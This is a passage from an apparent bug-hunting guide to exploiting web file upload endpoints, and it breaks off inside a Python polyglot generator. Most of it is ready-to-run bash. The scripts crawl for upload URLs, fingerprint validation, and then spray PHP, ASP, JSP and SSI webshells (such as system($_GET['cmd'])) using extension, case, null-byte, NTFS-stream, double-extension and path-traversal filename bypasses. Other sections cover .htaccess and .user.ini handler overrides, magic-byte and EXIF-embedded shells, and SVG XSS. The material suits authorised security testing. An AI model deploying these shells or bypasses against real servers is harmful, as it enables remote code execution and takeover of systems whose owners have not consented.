---
title: File Upload Pentesting
description: File Upload Pentesting — Complete Bug Hunting & Exploitation Methodology
navigation:
  icon: i-lucide-upload
  title: File Upload Pentesting
---

## File Upload Pentesting

::badge
**Critical Attack Surface — CWE-434 / CWE-436 / CWE-20**
::

Every file upload endpoint is a potential door to Remote Code Execution. The methodology is simple — find where the application accepts files, understand what validation it applies, then craft a payload that passes validation but executes as code. This guide is structured as a **sequential attack workflow**: discover endpoints, fingerprint defenses, select bypass techniques, craft payloads, upload and trigger, then verify execution. Every section contains the exact commands to run.

::tip
**Bug Hunting Priority Order:** Always start with the simplest attack. Upload a raw `.php` shell first. If that works, you don't need any bypass. Only escalate complexity when simple attacks fail. Most real-world file upload vulns are found by trying 3-5 basic techniques, not 300 advanced ones.
::

---

## Phase 1 — Endpoint Discovery

You cannot test what you cannot find. Upload functionality hides behind profile settings, import wizards, admin panels, API endpoints, rich text editors, support tickets, and backup restore features. A single application may have 10+ upload endpoints with different validation levels.

### Automated Crawling & URL Collection

::tabs
  :::tabs-item{icon="i-lucide-radar" label="Deep Crawling"}
  ```bash
  TARGET="target.com"

  # Katana deep crawl with JavaScript rendering
  katana -u "https://${TARGET}" -d 5 -jc -kf \
    -ef css,woff,woff2,svg,ico,ttf,eot \
    -o crawl_results.txt 2>/dev/null

  # Filter for upload-related URLs
  grep -iE "upload|import|attach|file|media|image|avatar|photo|document|resume|logo|banner|cover|backup|restore|migrate|extract|theme|plugin|install|bulk|batch|ingest" \
    crawl_results.txt | sort -u | tee upload_endpoints.txt

  # Historical URL collection from multiple sources
  {
      echo "$TARGET" | gau --threads 10 2>/dev/null
      echo "$TARGET" | waybackurls 2>/dev/null
      curl -s "https://web.archive.org/cdx/search/cdx?url=*.${TARGET}/*&output=text&fl=original&collapse=urlkey" 2>/dev/null
  } | grep -iE "upload|attach|import|file|media|image|\.ashx|handler" | sort -u >> upload_endpoints.txt

  # Parameter discovery on main pages
  paramspider -d "$TARGET" 2>/dev/null | \
    grep -iE "upload|file|attach|import|path|doc|media" >> upload_endpoints.txt

  sort -u upload_endpoints.txt -o upload_endpoints.txt
  echo "[+] Found $(wc -l < upload_endpoints.txt) upload-related URLs"
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Path Brute Forcing"}
  ```bash
  TARGET="https://target.com"

  ffuf -u "${TARGET}/FUZZ" -t 40 -mc 200,201,204,301,302,401,403,405 -w <(cat << 'PATHS'
  upload
  upload.php
  Upload
  api/upload
  api/v1/upload
  api/v2/upload
  api/v1/files
  api/v2/files
  api/files/upload
  api/media
  api/media/upload
  api/images
  api/images/upload
  api/attachments
  api/documents
  api/import
  api/v1/import
  api/bulk-import
  api/data/import
  api/archive/upload
  api/backup/upload
  api/backup/restore
  admin/upload
  admin/media
  admin/files
  admin/restore
  admin/backup/upload
  admin/import
  admin/theme/upload
  admin/plugin/install
  user/avatar
  user/photo
  user/profile/photo
  profile/photo
  profile/avatar
  profile/cover
  settings/logo
  settings/favicon
  settings/import
  editor/upload
  ckeditor/upload
  ckeditor/filemanager/upload
  tinymce/upload
  elfinder/connector
  elfinder/connector.php
  filemanager/upload
  filemanager/connectors/php/upload
  media/upload
  content/upload
  attachment/add
  attachment/upload
  file/new
  file/process
  document/upload
  report/import
  template/upload
  batch/upload
  async-upload.php
  wp-admin/async-upload.php
  wp-json/wp/v2/media
  UploadHandler.ashx
  FileHandler.ashx
  ImageUpload.ashx
  Telerik.Web.UI.DialogHandler.aspx
  Telerik.Web.UI.WebResource.axd
  umbraco/backoffice/UmbracoApi/Media/PostAddFile
  PATHS
  )

  echo "[*] Review results for accessible upload endpoints"
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="JavaScript Source Mining"}
  ```bash
  TARGET="https://target.com"

  # Extract and analyze JavaScript files for upload logic
  grep -iE "\.js(\?|$)" crawl_results.txt | sort -u > js_files.txt

  while IFS= read -r js_url; do
      CONTENT=$(curl -s "$js_url" 2>/dev/null)
      if echo "$CONTENT" | grep -qiE "upload|formData\.append|FileReader|dropzone|plupload|resumable|filepond|tus|chunk"; then
          echo ""
          echo "═══ Upload logic in: $js_url ═══"
          # Upload endpoint URLs
          echo "$CONTENT" | grep -oiE "(url|endpoint|action|target|uploadUrl|postUrl|apiUrl)\s*[:=]\s*['\"][^'\"]{5,}['\"]" | head -10
          # Allowed types / size limits
          echo "$CONTENT" | grep -oiE "(allowed|accepted|valid|permitted)(Types|Extensions|Formats|MimeTypes)\s*[:=]\s*\[[^\]]*\]" | head -5
          echo "$CONTENT" | grep -oiE "(max|maximum|limit)(Size|FileSize)\s*[:=]\s*[0-9]+" | head -5
          # Validation function names
          echo "$CONTENT" | grep -oiE "(validate|check|filter|isValid)(File|Upload|Type|Extension)\s*[:=(]" | head -5
          # Chunk upload detection
          echo "$CONTENT" | grep -oiE "(chunk_size|chunkSize|maxChunkSize)\s*[:=]\s*[0-9]+" | head -3
      fi
  done < js_files.txt
  ```
  :::
::

### Server & Technology Identification

The target technology determines which extensions execute, which bypasses work, and which payloads to craft.

::code-group
```bash [HTTP Header Fingerprinting]
TARGET="https://target.com"

echo "═══ Server Technology Stack ═══"

# Core identification
curl -sI "$TARGET" | grep -iE "^server:|^x-powered-by:|^x-aspnet|^x-aspnetmvc|^x-generator|^x-runtime|^x-drupal|^x-wordpress"

# Detailed fingerprint
whatweb "$TARGET" -v 2>/dev/null | head -10

# PHP version (critical for null byte, extension handling)
PHP_VER=$(curl -sI "$TARGET" | grep -i "x-powered-by" | grep -oP "PHP/[\d.]+")
echo "PHP Version: ${PHP_VER:-Not detected}"
[ -n "$PHP_VER" ] && echo "  Note: PHP < 5.3.4 vulnerable to null byte injection"

# Detect IIS (Windows) vs Apache/Nginx (Linux)
SERVER=$(curl -sI "$TARGET" | grep -i "^server:" | head -1)
echo "$SERVER" | grep -qi "microsoft-iis" && echo "[+] IIS detected — test .aspx .ashx .asp .cer .asa, NTFS ADS, semicolons"
echo "$SERVER" | grep -qi "apache" && echo "[+] Apache detected — test .phtml .php5 .pht .phar .htaccess"
echo "$SERVER" | grep -qi "nginx" && echo "[+] Nginx detected — test path_info, .user.ini"
echo "$SERVER" | grep -qi "litespeed" && echo "[+] LiteSpeed detected — partial .htaccess support"
```

```bash [Handler Detection]
TARGET="https://target.com"

echo "═══ Active Handler Detection ═══"
echo "[*] Testing which extensions the server recognizes as executable"

# Status codes that indicate a handler is active:
# 403 = handler recognized extension, access denied
# 500 = handler tried to execute, got error
# 502/503 = handler active, backend error
# 404 = no special handling, standard not found

for ext in php php5 phtml pht phar phps \
           aspx ashx asp asmx asa cer \
           jsp jspx jsw jsv jspf \
           cfm cfml cfc \
           pl cgi py rb \
           shtml stm; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/nonexistent_handler_test.${ext}" 2>/dev/null)
    case $STATUS in
        403)     echo "  [ACTIVE]  .${ext} → 403 (handler recognized, access denied)" ;;
        500)     echo "  [ACTIVE]  .${ext} → 500 (handler tried to execute)" ;;
        502|503) echo "  [ACTIVE]  .${ext} → ${STATUS} (handler active, backend error)" ;;
        404)     ;; # Standard — no special handling
        *)       echo "  [?]       .${ext} → ${STATUS}" ;;
    esac
done
```

```bash [Filesystem Case Sensitivity]
TARGET="https://target.com"

echo "═══ Filesystem Case Sensitivity ═══"

STATUS_LOWER=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/index.html" 2>/dev/null)
STATUS_UPPER=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/INDEX.HTML" 2>/dev/null)
STATUS_MIXED=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}/Index.Html" 2>/dev/null)

echo "  /index.html → ${STATUS_LOWER}"
echo "  /INDEX.HTML → ${STATUS_UPPER}"
echo "  /Index.Html → ${STATUS_MIXED}"

if [ "$STATUS_LOWER" = "$STATUS_UPPER" ] && [ "$STATUS_LOWER" != "404" ]; then
    echo "[+] Case-INSENSITIVE (Windows/macOS)"
    echo "    .PHP .pHp .Php all execute identically"
    echo "    NTFS ADS (::$DATA) available"
    echo "    Trailing dots/spaces stripped by OS"
else
    echo "[+] Case-SENSITIVE (Linux)"
    echo "    .PHP and .php are different files"
    echo "    Case bypass depends on handler configuration"
fi

# Check security headers on upload serving
echo ""
echo "═══ Upload Content Security ═══"
for path in /uploads/ /images/ /media/ /files/ /static/; do
    HEADERS=$(curl -sI "${TARGET}${path}" 2>/dev/null)
    STATUS=$(echo "$HEADERS" | head -1 | awk '{print $2}')
    if [ "$STATUS" != "404" ] && [ -n "$STATUS" ]; then
        NOSNIFF=$(echo "$HEADERS" | grep -i "x-content-type-options" | tr -d '\r')
        echo "  [${STATUS}] ${path}"
        echo "       nosniff: ${NOSNIFF:-❌ MISSING — content sniffing possible}"
    fi
done
```
::

---

## Phase 2 — Validation Fingerprinting

Before crafting bypass payloads, systematically determine **every validation layer** the target implements. This tells you exactly which techniques to use and which to skip.

::warning
**Critical concept:** Validation fingerprinting must be done BEFORE bypass attempts. Spraying 500 random payloads wastes time. Spending 5 minutes understanding the validation saves hours.
::

### Layered Validation Probe

::code-collapse
```bash [validation_fingerprint.sh]
#!/bin/bash
# ═══════════════════════════════════════════════
# File Upload Validation Fingerprinter
# Tests each validation layer independently
# ═══════════════════════════════════════════════
# Usage: ./validation_fingerprint.sh <upload_url> <cookie> [field]

UPLOAD_URL="${1:?Usage: $0 <upload_url> <cookie> [field]}"
COOKIE="${2:?Provide cookie value}"
FIELD="${3:-file}"

SHELL='<?php echo "VALIDATION_FINGERPRINT_TEST_".php_uname(); ?>'

# Create test files
echo "$SHELL" > /tmp/vf_php.txt
echo "test content" > /tmp/vf_text.txt
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > /tmp/vf_valid.jpg
printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'"$SHELL" > /tmp/vf_magic_php.bin
echo -n "GIF89a${SHELL}" > /tmp/vf_gif_php.bin
echo 'AddType application/x-httpd-php .jpg' > /tmp/vf_htaccess
echo 'auto_prepend_file=shell.jpg' > /tmp/vf_userini

> /tmp/vf_results.txt

upload_test() {
    local desc="$1" file="$2" filename="$3" ct="$4"
    local status resp result

    status=$(curl -s -o /tmp/vf_resp.txt -w "%{http_code}" \
      -X POST "$UPLOAD_URL" \
      -F "${FIELD}=@${file};filename=${filename};type=${ct}" \
      -H "Cookie: $COOKIE" 2>/dev/null)

    resp=$(cat /tmp/vf_resp.txt 2>/dev/null)
    result="BLOCKED"
    if [ "$status" = "200" ] || [ "$status" = "201" ]; then
        if echo "$resp" | grep -qiE "success|upload|saved|created|url|path|file" && \
           ! echo "$resp" | grep -qiE "error|invalid|denied|blocked|forbidden|not allowed|reject"; then
            result="ACCEPTED"
        fi
    fi

    printf "  %-55s [%s] %s\n" "$desc" "$status" "$result"
    echo "$desc|$result|$status" >> /tmp/vf_results.txt
}

echo "═══════════════════════════════════════════════════════"
echo " File Upload Validation Fingerprinter"
echo "═══════════════════════════════════════════════════════"
echo "[*] Target: $UPLOAD_URL"
echo "[*] Field:  $FIELD"
echo ""

# ── Layer 1: Extension Validation ──
echo "─── Layer 1: Extension Validation ───"
upload_test "Direct .php upload"                          /tmp/vf_php.txt    "test.php"      "application/x-php"
upload_test "Direct .txt upload"                          /tmp/vf_text.txt   "test.txt"      "text/plain"
upload_test "Direct .jpg upload (valid JPEG)"             /tmp/vf_valid.jpg  "test.jpg"      "image/jpeg"
upload_test "Random extension .xyz123"                    /tmp/vf_text.txt   "test.xyz123"   "text/plain"

# ── Layer 2: Blacklist vs Whitelist ──
echo ""
echo "─── Layer 2: Blacklist vs Whitelist Detection ───"
RANDOM_ACC=$(grep "Random extension" /tmp/vf_results.txt | grep -c "ACCEPTED")
PHP_BLOCK=$(grep "Direct .php" /tmp/vf_results.txt | grep -c "BLOCKED")
if [ "$RANDOM_ACC" -gt 0 ] && [ "$PHP_BLOCK" -gt 0 ]; then
    echo "  [+] BLACKLIST detected — unknown extensions allowed"
elif [ "$RANDOM_ACC" -eq 0 ]; then
    echo "  [+] WHITELIST detected — only specific extensions allowed"
else
    echo "  [?] Unclear — test more extensions"
fi

# ── Layer 3: Content-Type Validation ──
echo ""
echo "─── Layer 3: Content-Type Header Validation ───"
upload_test "PHP + CT:image/jpeg"                         /tmp/vf_php.txt    "test.php"      "image/jpeg"
upload_test "PHP + CT:image/png"                          /tmp/vf_php.txt    "test.php"      "image/png"
upload_test "PHP + CT:application/octet-stream"           /tmp/vf_php.txt    "test.php"      "application/octet-stream"

# ── Layer 4: Magic Byte Validation ──
echo ""
echo "─── Layer 4: Magic Byte / Content Validation ───"
upload_test "JPEG magic + PHP content (.jpg ext)"         /tmp/vf_magic_php.bin "test.jpg"   "image/jpeg"
upload_test "JPEG magic + PHP content (.php ext)"         /tmp/vf_magic_php.bin "test.php"   "image/jpeg"
upload_test "GIF magic + PHP content (.gif ext)"          /tmp/vf_gif_php.bin   "test.gif"   "image/gif"
upload_test "GIF magic + PHP content (.php ext)"          /tmp/vf_gif_php.bin   "test.php"   "image/gif"

# ── Layer 5: Alternative PHP Extensions ──
echo ""
echo "─── Layer 5: Alternative Executable Extensions ───"
for ext in phtml php5 php7 php4 pht phps phar pgif inc php3 php8 phtm module; do
    upload_test ".${ext} extension"                       /tmp/vf_php.txt    "test.${ext}"   "image/jpeg"
done

# ── Layer 6: Case Variations ──
echo ""
echo "─── Layer 6: Case Sensitivity ───"
for ext in PHP pHp Php PhP pHP PHp phP pHtMl PHTML Php5 PHP5; do
    upload_test ".${ext} case variation"                  /tmp/vf_php.txt    "test.${ext}"   "image/jpeg"
done

# ── Layer 7: Double Extensions ──
echo ""
echo "─── Layer 7: Double Extensions ───"
upload_test ".php.jpg (exec first)"                       /tmp/vf_php.txt    "test.php.jpg"  "image/jpeg"
upload_test ".jpg.php (exec last)"                        /tmp/vf_php.txt    "test.jpg.php"  "image/jpeg"
upload_test ".phtml.jpg"                                  /tmp/vf_php.txt    "test.phtml.jpg" "image/jpeg"
upload_test ".php5.png"                                   /tmp/vf_php.txt    "test.php5.png" "image/png"

# ── Layer 8: Special Characters ──
echo ""
echo "─── Layer 8: Special Characters & OS Tricks ───"
upload_test ".php. (trailing dot)"                        /tmp/vf_php.txt    "test.php."     "image/jpeg"
upload_test ".php%20 (trailing space)"                    /tmp/vf_php.txt    "test.php%20"   "image/jpeg"
upload_test ".php%00.jpg (null byte)"                     /tmp/vf_php.txt    "test.php%00.jpg" "image/jpeg"
upload_test '.php::$DATA (NTFS ADS)'                     /tmp/vf_php.txt    'test.php::$DATA' "image/jpeg"
upload_test ".php;.jpg (IIS semicolon)"                   /tmp/vf_php.txt    "test.php;.jpg" "image/jpeg"
upload_test ".php/.jpg (path separator)"                  /tmp/vf_php.txt    "test.php/.jpg" "image/jpeg"

# ── Layer 9: Configuration File Upload ──
echo ""
echo "─── Layer 9: Configuration File Upload ───"
upload_test ".htaccess upload"                            /tmp/vf_htaccess   ".htaccess"     "text/plain"
upload_test ".user.ini upload"                            /tmp/vf_userini    ".user.ini"     "text/plain"
upload_test "web.config upload"                           /tmp/vf_text.txt   "web.config"    "text/xml"

# ── Layer 10: Path Traversal in Filename ──
echo ""
echo "─── Layer 10: Path Traversal ───"
upload_test "../shell.php (path traversal)"               /tmp/vf_php.txt    "../shell.php"  "image/jpeg"
upload_test "../../shell.php (deeper traversal)"          /tmp/vf_php.txt    "../../shell.php" "image/jpeg"
upload_test "..%2fshell.php (encoded traversal)"          /tmp/vf_php.txt    "..%2fshell.php" "image/jpeg"

# ── Layer 11: ASP.NET Extensions (if IIS) ──
echo ""
echo "─── Layer 11: ASP.NET / IIS Extensions ───"
echo '<%eval request("cmd")%>' > /tmp/vf_asp.txt
echo '<%@ Page Language="C#" %><%Response.Write("test");%>' > /tmp/vf_aspx.txt
for ext in aspx ashx asmx asp asa cer cdx cshtml config ASPX ASP; do
    upload_test ".${ext} extension"                       /tmp/vf_aspx.txt   "test.${ext}"   "image/jpeg"
done

# ── Layer 12: JSP Extensions ──
echo ""
echo "─── Layer 12: JSP Extensions ───"
echo '<%out.println("test");%>' > /tmp/vf_jsp.txt
for ext in jsp jspx jsw jsv jspf JSP JsP; do
    upload_test ".${ext} extension"                       /tmp/vf_jsp.txt    "test.${ext}"   "image/jpeg"
done

# ── Layer 13: XSS / Client-Side Vectors ──
echo ""
echo "─── Layer 13: XSS File Types ───"
echo '<script>alert(1)</script>' > /tmp/vf_xss.txt
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' > /tmp/vf_svg.txt
for ext in svg html htm xhtml xml hta mhtml shtml; do
    upload_test ".${ext} extension"                       /tmp/vf_xss.txt    "test.${ext}"   "image/jpeg"
done
upload_test ".svg with onload"                            /tmp/vf_svg.txt    "test.svg"      "image/svg+xml"

# ═══════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════════════════════"
echo " RESULTS SUMMARY"
echo "═══════════════════════════════════════════════════════"
ACCEPTED_COUNT=$(grep -c "ACCEPTED" /tmp/vf_results.txt 2>/dev/null)
TOTAL_COUNT=$(wc -l < /tmp/vf_results.txt 2>/dev/null)
echo "[*] ${ACCEPTED_COUNT}/${TOTAL_COUNT} tests accepted"
echo ""

if [ "$ACCEPTED_COUNT" -gt 0 ]; then
    echo "[+] Accepted uploads — these are your bypass vectors:"
    grep "ACCEPTED" /tmp/vf_results.txt | cut -d'|' -f1 | sed 's/^/    ✓ /'
fi

echo ""
echo "[*] Next steps based on accepted uploads:"
grep -q "Direct .php.*ACCEPTED" /tmp/vf_results.txt && echo "    → Direct PHP upload works! No bypass needed."
grep -q "\.phtml.*ACCEPTED" /tmp/vf_results.txt && echo "    → Alternative extension bypass (.phtml)"
grep -q "case variation.*ACCEPTED" /tmp/vf_results.txt && echo "    → Case sensitivity bypass"
grep -q "Double.*ACCEPTED" /tmp/vf_results.txt && echo "    → Double extension bypass"
grep -q "Magic.*ACCEPTED" /tmp/vf_results.txt && echo "    → Magic byte forgery bypass"
grep -q "htaccess.*ACCEPTED" /tmp/vf_results.txt && echo "    → .htaccess handler override chain"
grep -q "user.ini.*ACCEPTED" /tmp/vf_results.txt && echo "    → .user.ini auto_prepend chain"
grep -q "web.config.*ACCEPTED" /tmp/vf_results.txt && echo "    → web.config handler override chain"
grep -q "traversal.*ACCEPTED" /tmp/vf_results.txt && echo "    → Path traversal file write"
grep -q "svg.*ACCEPTED" /tmp/vf_results.txt && echo "    → SVG XSS / SSRF vector"
grep -q "Trailing\|null\|NTFS\|semicolon" /tmp/vf_results.txt | grep -q "ACCEPTED" && echo "    → OS-specific tricks"

# Cleanup
rm -f /tmp/vf_*.txt /tmp/vf_*.bin /tmp/vf_resp.txt /tmp/vf_results.txt /tmp/vf_htaccess /tmp/vf_userini
```
::

### Validation Decision Matrix

After fingerprinting, use this matrix to select your attack strategy:

::collapsible

| Fingerprint Result | Recommended Attack |
| ------------------ | ------------------ |
| Direct `.php` accepted | No bypass needed — upload webshell directly |
| `.phtml`/`.php5`/`.pht` accepted | Alternative extension bypass |
| `.PHP`/`.pHp` accepted | Case sensitivity bypass |
| `.php.jpg` accepted | Double extension bypass |
| JPEG magic + PHP in `.jpg` accepted | Magic byte forgery + handler override chain |
| `.htaccess` accepted | Two-stage: handler override → shell as image |
| `.user.ini` accepted | Two-stage: auto_prepend → shell as image |
| `web.config` accepted | Two-stage: IIS handler → shell as image |
| `../shell.php` accepted | Path traversal to write outside upload dir |
| `.svg` accepted | SVG XSS, SVG SSRF/XXE |
| Only valid images accepted | Polyglot file, EXIF injection, or race condition |
| Everything blocked | Client-side only? Try cURL directly. Or chunked upload manipulation. |

::

---

## Phase 3 — Bypass Payload Crafting

Based on your fingerprinting results, craft the appropriate payload. This section covers every major bypass category with ready-to-use commands.

### Extension Bypass — Alternative Extensions

::tabs
  :::tabs-item{icon="i-lucide-file-code" label="PHP Extension Spray"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"
  SHELL='<?php echo "EXT_BYPASS_".php_uname(); system($_GET["cmd"]); ?>'
  echo "$SHELL" > /tmp/ext_shell.txt

  echo "═══ PHP Extension Spray ═══"

  # Tier 1: Commonly forgotten
  for ext in phtml php5 php7 pht phps phar; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ext_shell.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED ←←← TRY THIS"
  done

  # Tier 2: Rarely blocked
  for ext in php4 php3 php8 pgif phtm phpt inc module; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ext_shell.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # Tier 3: All case permutations of .php
  python3 -c "
  from itertools import product
  for combo in product(*[(c.lower(),c.upper()) for c in 'php']):
      print(''.join(combo))
  " 2>/dev/null | while read ext; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "${FIELD}=@/tmp/ext_shell.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} CASE BYPASS"
  done

  rm -f /tmp/ext_shell.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="ASP / IIS Extension Spray"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  ASPX_SHELL='<%@ Page Language="C#" %><%Response.Write("ASPX_BYPASS_"+System.Environment.MachineName);%>'
  ASP_SHELL='<%eval request("cmd")%>'
  echo "$ASPX_SHELL" > /tmp/aspx.txt
  echo "$ASP_SHELL" > /tmp/asp.txt

  echo "═══ IIS Extension Spray ═══"

  # ASP.NET extensions
  for ext in aspx ashx asmx asp asa cer cdx cshtml vbhtml svc config; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/aspx.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  # IIS-specific tricks
  for name in "shell.aspx." "shell.aspx%20" 'shell.aspx::$DATA' \
              "shell.aspx;.jpg" "shell.asp;.png" "shell.cer;.jpg"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/aspx.txt;filename=${name};type=image/jpeg" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ${name} IIS BYPASS"
  done

  rm -f /tmp/aspx.txt /tmp/asp.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="JSP / Other Extensions"}
  ```bash
  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  echo '<%out.println("JSP_BYPASS");%>' > /tmp/jsp.txt
  echo '<!--#exec cmd="id"-->' > /tmp/ssi.txt

  echo "═══ JSP + SSI + Other Spray ═══"

  for ext in jsp jspx jsw jsv jspf JSP JsP Jsp; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/jsp.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  for ext in shtml stm shtm cfm cfml cfc pl cgi py rb sh; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/ssi.txt;filename=shell.${ext};type=image/jpeg" \
        -H "Cookie: $COOKIE")
      [ "$STATUS" = "200" ] && echo "[+] .${ext} ACCEPTED"
  done

  rm -f /tmp/jsp.txt /tmp/ssi.txt
  ```
  :::
::

### Double Extensions, Trailing Characters & Encoding Tricks

::code-group
```bash [Double Extension Spray]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
SHELL='<?php system($_GET["cmd"]); ?>'
echo "$SHELL" > /tmp/dbl.txt

# Pattern: exec.safe (validation sees last ext, Apache may execute first)
for combo in php.jpg php.png php.gif php.txt php.pdf \
             phtml.jpg php5.jpg pht.jpg phar.jpg \
             asp.jpg aspx.jpg jsp.jpg; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/dbl.txt;filename=shell.${combo};type=image/jpeg" \
      -H "Cookie: $COOKIE")
    [ "$STATUS" = "200" ] && echo "[+] shell.${combo}"
done

# Pattern: safe.exec (validation sees first ext)
for combo in jpg.php png.php gif.php txt.php \
             jpg.phtml png.php5 gif.pht; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/dbl.txt;filename=shell.${combo};type=image/jpeg" \
      -H "Cookie: $COOKIE")
    [ "$STATUS" = "200" ] && echo "[+] shell.${combo}"
done

rm -f /tmp/dbl.txt
```

```bash [Trailing Characters & OS Tricks]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
SHELL='<?php system($_GET["cmd"]); ?>'
echo "$SHELL" > /tmp/trail.txt

for name in \
    "shell.php." "shell.php.." "shell.php..." \
    "shell.php%20" "shell.php%09" "shell.php%0a" "shell.php%0d" \
    "shell.php " "shell.php%00" "shell.php%00.jpg" \
    "shell.php%2500.jpg" "shell.php%c0%80.jpg" \
    'shell.php::$DATA' 'shell.php::$DATA......' \
    "shell.php;.jpg" "shell.php/.jpg" "shell.php%2f.jpg" \
    "shell.%70%68%70" "shell.p%68p" "shell.ph%70"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/trail.txt;filename=${name};type=image/jpeg" \
      -H "Cookie: $COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] && echo "[+] ${name} ACCEPTED"
done

rm -f /tmp/trail.txt
```

```bash [Content-Type Manipulation]
UPLOAD_URL="https://target.com/api/upload"
COOKIE="session=TOKEN"
SHELL='<?php system($_GET["cmd"]); ?>'
echo "$SHELL" > /tmp/ct.txt

for ct in "image/jpeg" "image/png" "image/gif" "image/bmp" "image/webp" \
          "application/octet-stream" "text/plain" "text/html" \
          "image/pjpeg" "image/x-png" "application/x-httpd-php"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
      -F "file=@/tmp/ct.txt;filename=shell.php;type=${ct}" \
      -H "Cookie: $COOKIE" 2>/dev/null)
    [ "$STATUS" = "200" ] && echo "[+] .php + CT:${ct}"
done

rm -f /tmp/ct.txt
```
::

### Magic Byte Forgery & Polyglot Files

::tabs
  :::tabs-item{icon="i-lucide-wand" label="Quick Magic Byte Shells"}
  ```bash
  # GIF — easiest (plain ASCII)
  echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

  # JPEG — binary header
  printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' > shell.php
  echo '<?php system($_GET["cmd"]); ?>' >> shell.php

  # PNG — binary header
  printf '\x89PNG\r\n\x1a\n' > shell.php
  echo '<?php system($_GET["cmd"]); ?>' >> shell.php

  # BMP — binary header
  printf 'BM' > shell.php
  echo '<?php system($_GET["cmd"]); ?>' >> shell.php

  # PDF — ASCII header
  echo '%PDF-1.4<?php system($_GET["cmd"]); ?>' > shell.pdf.php

  # Verify
  file shell.gif  # GIF image data, version 89a
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="EXIF Metadata Injection"}
  ```bash
  # Inject PHP into a REAL valid image's EXIF metadata
  # Passes full image parsing, getimagesize(), re-encoding in some cases

  # Create valid image
  python3 -c "from PIL import Image; Image.new('RGB',(200,200),'red').save('base.jpg','JPEG',quality=95)" 2>/dev/null

  # Inject PHP into ALL EXIF fields (redundancy)
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -ImageDescription='<?php eval($_POST["e"]); ?>' \
    -Artist='<?=`$_GET[c]`?>' \
    -Copyright='<?php passthru($_GET["cmd"]); ?>' \
    -UserComment='<?php echo shell_exec($_REQUEST["cmd"]); ?>' \
    -Make='<?php phpinfo(); ?>' \
    -Model='<?php readfile($_GET["f"]); ?>' \
    -overwrite_original base.jpg

  # Verify valid + payload present
  file base.jpg
  strings base.jpg | grep -c "php"
  cp base.jpg exif_shell.phtml
  cp base.jpg exif_shell.php.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-wand" label="Polyglot Generator (Python)"}
  ```python [polyglot_gen.py]
  #!/usr/bin/env python3
  """Generate polyglot files valid as images AND containing PHP"""
  import struct
  from PIL import Image
  import io, os

  def jpeg_php(output, php_code):
      img = Image.new('RGB', (100, 100), 'blue')
      buf = io.BytesIO()
      img.save(buf, 'JPEG', quality=95)
      jpg = buf.getvalue()
      payload = php_code.encode()
      com = b'\xff\xfe' + struct.pack('>H', len(payload)+2) + payload
      with open(output, 'wb') as f:
          f.write(jpg[:2] + com + jpg[2:])
      Image.open(output).verify()
      print(f"[+] {output} — Valid JPEG + PHP")

  def gif_php(output, php_code):
      payload = php_code.encode()
      gif = bytearray(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00')
